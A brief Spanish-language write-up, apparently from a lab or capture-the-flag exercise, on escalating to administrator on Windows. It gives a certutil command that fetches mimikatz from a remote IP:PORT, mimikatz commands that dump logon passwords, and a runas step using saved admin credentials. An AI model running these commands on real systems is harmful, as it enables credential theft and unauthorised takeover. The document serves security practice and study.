Root.txt

Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.

Miramos nuestros prvilegios:
    - whoami /all
    - net user username

Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
    net localgroup group_name 

En la descripcion pone que podemos ejecutar el binario wuauclt.exe con privilegios administrador de la siguiente forma:
C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'

Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
Y nos pone lo que tenemos que hacer para realizar la escalada.

Descargar mimikatz.exe:
    - python3 - hhtp.server
    - certutil -f -urlcache -split http://IP:PORT/mimikatz.exe

Ejecutar mimikatz.exe:
    - log
    - privilege::debug, 
    - sekurlsa::logonpasswords
    - exit 

Y en el archivo .log creado o en la pantalla mismo, ver si hay alguna cred. ¡Bingo! Tenemos la del admin. Al pareceder a ejecutado alguna tarea y se han 
guardado sus credenciales.

Ahora con la pass podemos convertirnos en admin:
runas /user:administrator /savedcred powershell